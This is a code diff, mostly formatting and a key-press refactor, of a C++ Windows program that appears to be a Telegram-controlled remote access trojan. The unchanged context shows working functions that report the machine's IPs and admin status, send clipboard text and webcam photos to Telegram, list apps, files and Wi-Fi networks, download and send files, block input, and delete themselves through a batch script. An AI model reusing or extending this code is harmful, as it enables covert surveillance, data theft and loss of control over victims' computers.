@@ -1,14 +1,18 @@
+#include "commands.h"
+
 #include <string>
 #include <fstream>
 #include <iostream>
 #include <Windows.h>
 #include <chrono>
 #include <thread>
+#include <vector>
+
 #include <opencv2/opencv.hpp>
 #include <nlohmann/json.hpp>
+
 #include "parse.h"
 #include "execute.h"
-#include "commands.h"
 #include "telegram.h"
 #include "tools.h"
 #include "globals.h"
@@ -25,8 +29,8 @@ void getStatus(std::string) {
     status += "local_ip: \n";
 
     auto LocalIp = tools::getLocalIp();
-    for (auto& i : LocalIp) {
-        status += "  " + i.first + ": " + i.second + "\n";
+    for (auto& e : LocalIp) {
+        status += "  " + e.first + ": " + e.second + "\n";
     }
     status += "admin_rights: " + tools::admin_rights() + '\n';
     status += "exe_path: " + tools::get_path() + '\n';
@@ -55,13 +59,11 @@ void setVolume(std::string value) {
         return;
     }
 
-    int what_to_do = 1; //1 = set, 2 = increase, 3 = decrease
+    int what_to_do = 1;  // 1 = set, 2 = increase, 3 = decrease
     if (value[0] == '+')
         what_to_do = 2;
     if (value[0] == '-')
         what_to_do = 3;
-
-    DEBUG(what_to_do);
 
     if (value[0] == '+' || value[0] == '-')
         value.erase(0, 1);
@@ -72,11 +74,10 @@ void setVolume(std::string value) {
     }
 
     int volume = atoi(value.c_str());
-    DEBUG(volume);
 
     if (what_to_do == 2)
         volume += tools::ChangeVolume();
-    if(what_to_do == 3) 
+    if (what_to_do == 3)
         volume = tools::ChangeVolume() - volume;
 
     if (volume < 0)
@@ -150,13 +151,12 @@ void Delay(std::string delay) {
             continue;
         }
 
-        if (state == 0) 
+        if (state == 0)
             seconds += delay[i];
         if (state == 1)
             function += delay[i];
         if (state > 1)
             parameters += delay[i];
-        
     }
 
     if (seconds.find_first_not_of("0123456789") != std::string::npos) {
@@ -192,9 +192,10 @@ void BlockCursor(std::string time) {
 }
 
 void BlockClipboard(std::string yesornot) {
-
-    if (yesornot == "true")  OpenClipboard(nullptr);
-    else CloseClipboard();
+    if (yesornot == "true")
+        OpenClipboard(nullptr);
+    else
+        CloseClipboard();
 }
 
 void Press(std::string to_press) {
@@ -205,7 +206,7 @@ void Press(std::string to_press) {
         bool low = false;
         if (islower(e) || isdigit(e))
             low = true;
-        
+
         std::string low_chars = "`-=[];',./";
         for (auto& e1 : low_chars) {
             if (e == e1) {
@@ -214,55 +215,56 @@ void Press(std::string to_press) {
             }
         }
 
-        if(low)
+        if (low)
             tools::press_key(e);
-        else 
-            tools::press_key(e,1);
+        else
+            tools::press_key(e, 1);
     }
 }
 
 void hotkeys(std::string hotkey) {
     hotkey += "+";
     std::string buff;
-    //pressing keys
+    // pressing keys
     for (int i = 0; i < hotkey.size(); i++) {
         if (hotkey[i] == '+') {
-            //it looks like a shit but idk other way
-            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
-            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
-            else if (buff == "lmouse") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            // it looks like a shit but idk other way
+            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122)
+                keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
+            else if (buff == "esc") tools::pressSpecialKey(VK_ESCAPE, 0);
+            else if (buff == "tab") tools::pressSpecialKey(VK_TAB, 0);
+            else if (buff == "capslock") tools::pressSpecialKey(VK_CAPITAL, 0);
+            else if (buff == "shift") tools::pressSpecialKey(VK_SHIFT, 0);
+            else if (buff == "ctrl") tools::pressSpecialKey(VK_CONTROL, 0);
+            else if (buff == "win") tools::pressSpecialKey(VK_LWIN, 0);
+            else if (buff == "alt") tools::pressSpecialKey(VK_MENU, 0);
+            else if (buff == "ralt") tools::pressSpecialKey(VK_RMENU, 0);
+            else if (buff == "space") tools::pressSpecialKey(VK_SPACE, 0);
+            else if (buff == "enter") tools::pressSpecialKey(VK_RETURN, 0);
+            else if (buff == "backspace") tools::pressSpecialKey(VK_BACK, 0);
+            else if (buff == "del") tools::pressSpecialKey(VK_DELETE, 0);
+            else if (buff == "f1") tools::pressSpecialKey(VK_F1, 0);
+            else if (buff == "f2") tools::pressSpecialKey(VK_F2, 0);
+            else if (buff == "f3") tools::pressSpecialKey(VK_F3, 0);
+            else if (buff == "f4") tools::pressSpecialKey(VK_F4, 0);
+            else if (buff == "f5") tools::pressSpecialKey(VK_F5, 0);
+            else if (buff == "f6") tools::pressSpecialKey(VK_F6, 0);
+            else if (buff == "f7") tools::pressSpecialKey(VK_F7, 0);
+            else if (buff == "f8") tools::pressSpecialKey(VK_F8, 0);
+            else if (buff == "f9") tools::pressSpecialKey(VK_F9, 0);
+            else if (buff == "f10") tools::pressSpecialKey(VK_F10, 0);
+            else if (buff == "f11") tools::pressSpecialKey(VK_F11, 0);
+            else if (buff == "f12") tools::pressSpecialKey(VK_F12, 0);
+            else if (buff == "ins") tools::pressSpecialKey(VK_INSERT, 0);
+            else if (buff == "home") tools::pressSpecialKey(VK_HOME, 0);
+            else if (buff == "end") tools::pressSpecialKey(VK_END, 0);
+            else if (buff == "pgdn") tools::pressSpecialKey(VK_NEXT, 0);
+            else if (buff == "pgup") tools::pressSpecialKey(VK_PRIOR, 0);
+            else if (buff == "uparrow") tools::pressSpecialKey(VK_UP, 0);
+            else if (buff == "downarrow") tools::pressSpecialKey(VK_DOWN, 0);
+            else if (buff == "leftarrow") tools::pressSpecialKey(VK_LEFT, 0);
+            else if (buff == "rightarrow") tools::pressSpecialKey(VK_RIGHT, 0);
+            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 0);;
 
             buff.clear();
         }
@@ -270,46 +272,47 @@ void hotkeys(std::string hotkey) {
     }
     Sleep(10);
 
-    //unpressing keys
+    // unpressing keys
     buff.clear();
     for (int i = 0; i < hotkey.size(); i++) {
         if (hotkey[i] == '+') {
-            //it looks like a shit but idk other way
-            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
-            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
-            else if (buff == "leftbutton") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            // it looks like a shit but idk other way
+            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122)
+                keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
+            else if (buff == "esc") tools::pressSpecialKey(VK_ESCAPE, 1);
+            else if (buff == "tab") tools::pressSpecialKey(VK_TAB, 1);
+            else if (buff == "capslock") tools::pressSpecialKey(VK_CAPITAL, 1);
+            else if (buff == "shift") tools::pressSpecialKey(VK_SHIFT, 1);
+            else if (buff == "ctrl") tools::pressSpecialKey(VK_CONTROL, 1);
+            else if (buff == "win") tools::pressSpecialKey(VK_LWIN, 1);
+            else if (buff == "alt") tools::pressSpecialKey(VK_MENU, 1);
+            else if (buff == "ralt") tools::pressSpecialKey(VK_RMENU, 1);
+            else if (buff == "space") tools::pressSpecialKey(VK_SPACE, 1);
+            else if (buff == "enter") tools::pressSpecialKey(VK_RETURN, 1);
+            else if (buff == "backspace") tools::pressSpecialKey(VK_BACK, 1);
+            else if (buff == "del") tools::pressSpecialKey(VK_DELETE, 1);
+            else if (buff == "f1") tools::pressSpecialKey(VK_F1, 1);
+            else if (buff == "f2") tools::pressSpecialKey(VK_F2, 1);
+            else if (buff == "f3") tools::pressSpecialKey(VK_F3, 1);
+            else if (buff == "f4") tools::pressSpecialKey(VK_F4, 1);
+            else if (buff == "f5") tools::pressSpecialKey(VK_F5, 1);
+            else if (buff == "f6") tools::pressSpecialKey(VK_F6, 1);
+            else if (buff == "f7") tools::pressSpecialKey(VK_F7, 1);
+            else if (buff == "f8") tools::pressSpecialKey(VK_F8, 1);
+            else if (buff == "f9") tools::pressSpecialKey(VK_F9, 1);
+            else if (buff == "f10") tools::pressSpecialKey(VK_F10, 1);
+            else if (buff == "f11") tools::pressSpecialKey(VK_F11, 1);
+            else if (buff == "f12") tools::pressSpecialKey(VK_F12, 1);
+            else if (buff == "ins") tools::pressSpecialKey(VK_INSERT, 1);
+            else if (buff == "home") tools::pressSpecialKey(VK_HOME, 1);
+            else if (buff == "end") tools::pressSpecialKey(VK_END, 1);
+            else if (buff == "pgdn") tools::pressSpecialKey(VK_NEXT, 1);
+            else if (buff == "pgup") tools::pressSpecialKey(VK_PRIOR, 1);
+            else if (buff == "uparrow") tools::pressSpecialKey(VK_UP, 1);
+            else if (buff == "downarrow") tools::pressSpecialKey(VK_DOWN, 1);
+            else if (buff == "leftarrow") tools::pressSpecialKey(VK_LEFT, 1);
+            else if (buff == "rightarrow") tools::pressSpecialKey(VK_RIGHT, 1);
+            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 1);
 
             buff.clear();
         }
@@ -328,9 +331,9 @@ void SendClipboard(std::string) {
   
     CloseClipboard();
 
-    char* buff = (char*)clip;
+    char* buff = reinterpret_cast<char*>(clip);
     std::string text;
-    if (buff) 
+    if (buff)
         text = buff;
 
     telegram::SendText(text);
@@ -348,10 +351,9 @@ void Autodestruction(std::string) {
     f << "exit\n";
     f.close();
     system("start /min jd.bat");
-
 }
 
-//some legacy code from stackoverflow
+// some legacy code from stackoverflow
 void WriteToClipboard(std::string to_write) {
     HWND hwnd = GetDesktopWindow();
     OpenClipboard(hwnd);
@@ -399,12 +401,12 @@ void WebcamView(std::string) {
     // Get the frame
     cv::Mat save_img; cap >> save_img;
 
-    if (save_img.empty()){
+    if (save_img.empty()) {
         telegram::SendText("Something is wrong with the webcam, could not get frame.");
         return;
     }
     // Save the frame into a file
-    imwrite("wcm.jpg", save_img); // A JPG FILE IS BEING SAVED
+    imwrite("wcm.jpg", save_img);  // A JPG FILE IS BEING SAVED
     std::string path = tools::get_path() + "wcm.jpg";
 
     telegram::SendPhoto(path);
@@ -412,7 +414,7 @@ void WebcamView(std::string) {
 }
 
 void RunningApps(std::string) {
-    telegram::SendText(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42,TELEGRAM_MAX));
+    telegram::SendText(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42, TELEGRAM_MAX));
 }
 
 void ListOfFiles(std::string path) {
@@ -433,7 +435,7 @@ void ListOfFiles(std::string path) {
     telegram::SendText(output);
 }
 
-//legacy code from old project, may look like a piece of shit but it works (i mean i think it works)
+// legacy code from old project, may look like a piece of shit but it works (i mean i think it works)
 void WifiList(std::string) {
     std::vector<std::string> wifi;
 
@@ -490,11 +492,10 @@ void CloseForeground() {
 std::thread t1;
 
 void TurnCloseForeground(std::string turn) {
-    if (turn=="true") {
+    if (turn == "true") {
         ClosingForeground = true;
         t1 = std::thread(CloseForeground);
-    }
-    else {
+    } else {
         ClosingForeground = false;
         t1.join();
     }
@@ -540,7 +541,6 @@ void DownloadFile(std::string link) {
     }
 
     telegram::SendText("Downloaded.");
-
 }
 
 void SendFile(std::string path) {
